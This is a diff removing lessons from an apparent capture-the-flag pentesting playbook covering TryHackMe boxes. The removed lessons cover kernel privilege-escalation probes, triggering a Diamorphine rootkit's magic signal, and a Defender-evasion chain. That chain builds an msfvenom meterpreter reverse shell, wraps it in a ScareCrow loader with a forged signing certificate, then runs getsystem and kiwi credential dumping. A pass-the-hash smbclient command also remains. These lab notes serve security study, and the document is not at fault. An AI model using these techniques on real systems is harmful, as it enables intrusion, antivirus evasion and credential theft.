@@ -193,42 +193,6 @@ Then walk the manual checklist (do not skip any; the box's intended path is usua
 | Creds | configs, history, DB, `.ssh`, backups | reuse / su |
 | Kernel/pkg CVE | `uname -r`; pkg versions (pkexec/polkit, sudo, dbus) | **LAST resort** - check the patch level first (see lesson) |
 
-## Lesson: verify exploit preconditions before firing (THM Ollie)
-
-Intended path was PwnKit (CVE-2021-4034) but the box was kernel-patched:
-- **PwnKit dead** on kernels with the `argc==0` mitigation (5.x+); pkexec prints usage, GCONV_PATH never injects.
-- **CVE-2021-3560** dead once polkit >= 0.105-26ubuntu1.1 (race returns PermissionDenied in ~9ms).
-- **Nimbuspwn** needs to own `org.freedesktop.network1` (dbus policy usually = systemd-network only).
-- The real path was a **writable root systemd timer** (`feedme`) firing every minute - which **pspy/linpeas surface in seconds**. Run them first; treat kernel CVEs as the last resort and check `uname -r` + package patch level before burning time.
-
-**Kernel-CVE reflex = wiki-first, not memory.** When you DO reach for a kernel LPE, open
-[[privesc-exploit-arsenal]] FIRST (I once defaulted to stale public-CVE memory and dismissed a
-viable path). Match the exact `uname -r` band, then VERIFY the precondition before firing (module
-loadable / address-family reachable / unprivileged userns). The Tinoco 2026 page-cache set
-(copyfail/dirtyfrag/peditcow/... CVE-2026-*) spans 4.14->7.x and is unpatched on most pre-2026
-boxes. **Lab-confirmed:** copyfail CVE-2026-31431 roots a 5.4.0-173 box from a low-priv user
-(probe `socket.socket(38,SOCK_SEQPACKET).bind(("aead","authencesn(hmac(sha256),cbc(aes))"))` - if it
-binds, reachable; port the PoC's `os.splice` -> `ctypes` `syscall(275,...)` on Python 3.8; restore a
-poisoned file with root `echo 3 > /proc/sys/vm/drop_caches`). On a THM/HTB box you own, testing the
-arsenal end-to-end is fair game.
-
-## Lesson: LKM-rootkit privesc via sudo insmod - read the magic signal, don't trust the default (THM Athena)
-
-`sudo -l` showing `(root) NOPASSWD: /usr/sbin/insmod /path/rootkit.ko` is a ROOT primitive: the
-allowed module is a pre-built LKM rootkit (e.g. m0nad **Diamorphine**) - load it, then trigger its
-give-root magic signal. This is DISTINCT from CAP_SYS_MODULE (there you build your own module); here
-the module is fixed and you drive it by signal. Two gotchas that cost real time:
-- **The magic signal may be recompiled.** Diamorphine defaults are `kill -64 0` (root), `-63` (hide
-  proc), `-31` (hide module) - but the author can change them, and the default then silently does
-  nothing. Don't fire it from memory. The module is usually **not stripped**, so READ the real one:
-  `objdump -d rootkit.ko | sed -n '/<hacked_kill>:/,/<module_hide>:/p' | grep cmp` -> the `cmp $0xNN`
-  whose branch calls `give_root` is the signal (was `0x39` = 57 here, not 64). Reversing the artifact
-  beats guessing the same way `uname -r` + patch-level beats guessing a kernel CVE.
-- **A wrong (unhandled) signal kills your shell.** `kill -<sig> 0` targets the whole process group;
-  a rootkit only swallows the signals it HANDLES, so an unhandled number is delivered for real and
-  drops your session. The correct magic signal is handled (returns 0, no delivery) and is safe. See
-  [[linux-privesc]] / [[linux-rootkits]].
-
 ## Lesson: mutate leaked/labelled secrets; cookie-BFLA is not session admin (THM Support Panel)
 
 A PHP panel that leaked its own source via an LFI (`readfile`/`highlight_file` of `?skin=../config`):
@@ -274,34 +238,6 @@ Assumed-breach low-priv domain user; DA via a credential chain (no Linux, no mem
 - **Reading the flag as DA:** Defender may block `nxc -x`/wmiexec output retrieval - read files directly over SMB with
   PtH (`smbclient //DC/C$ -U DOM/Administrator --pw-nt-hash <hash> -c 'get <path>'`); no exec = no AV.
 
-## Lesson: Defender-blocked SeImpersonate -> solve Defender ONCE at the loader, not per-potato (THM Exfilibur)
-
-Windows/IIS10 box: foothold as the **IIS app-pool identity** (holds `SeImpersonatePrivilege`), Defender **active**, flags in an admin's Desktop (Access Denied). Load `Skill(hunt-macos)`? no - `Skill(hunt-ad)`/wiki [[windows-privesc]] [[windows-enumeration]] ([[scarecrow]] = the loader-first Defender evasion this lesson turns on).
-- **The trap (what cost the box): grinding the PRIMITIVE against AV.** We tried to get each standalone
-  potato **binary** past Defender one at a time - GodPotato/PrintSpoofer/SigmaPotato flagged on-disk,
-  offline-obfuscated builds still caught, in-memory SigmaPotato hung on the DCOM trigger, on-box compile
-  tripped AV. That is the anti-pattern: you are fighting Defender N times, once per artifact.
-- **The intended path: change the DELIVERY, not the primitive - solve Defender ONCE, at the implant.**
-  Get an **EDR-evading in-memory C2 session first**, then invoke the impersonation primitive from *inside*
-  that already-clean process (drops nothing new to disk, no standalone DCOM-trigger EXE to flag):
-  1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=.. LPORT=.. -f raw -o merlin.bin`
-  2. `./ScareCrow -I merlin.bin -domain Microsoft.com`  (`-domain` forges a code-signing cert; rename the
-     loader benign, e.g. `Outlook.exe`) -> Defender-clean loader.
-  3. Run it **from the app-pool shell** (the `SeImpersonate` holder - NOT a low-priv RDP user, or
-     impersonation has no token), catch in `multi/handler`. **Often fails the first run - just re-run.**
-  4. Meterpreter **`getsystem`** (Technique 1/2 = named-pipe impersonation = the same "potato", in-memory)
-     -> `NT AUTHORITY\SYSTEM`; then `load kiwi` to dump. Flags now readable.
-- **Egress-restricted Windows box:** fingerprint allowed OUTBOUND ports before picking C2 ports (here only
-  53 + 445 survived). Stage over one (`python3 -m http.server 445`), catch the callback on another
-  (`multi/handler` on 53).
-- **Alt when a C2 loader is not an option:** fresh **non-potato** local-EoP source PoCs compiled offline
-  carry no AV signature (Nightmare_Eclipse: **MiniPlasma** = weaponized *unpatched* CVE-2020-17103 `cldflt`
-  race -> SYSTEM, all Windows incl. Server; RedSun; LegacyHive). Race-based/hit-or-miss; lab-test first.
-- **Process misses this box exposed (see harness-retro):** (1) **winPEAS was never run** - Phase 4b mandates
-  it; a systematic Windows enum sweep is not optional just because a SeImpersonate potato "should" work.
-  (2) The RCE was a **direct `searchsploit` hit** (EDB-47010, BlogEngine.NET 3.3.7.0 theme dirPath RCE =
-  CVE-2019-6714) - the searchsploit/msf quick-win reflex finds it instantly. (Note: BlogEngine EDB/CVE
-  labels are widely conflated - 10718 XXE / 10719 / 6714 theme-RCE; 47010.py IS the theme-RCE.)
 
 ## Lesson: crypto-app chain -> invite forge -> padding-oracle RCE (THM Decryptify)
 
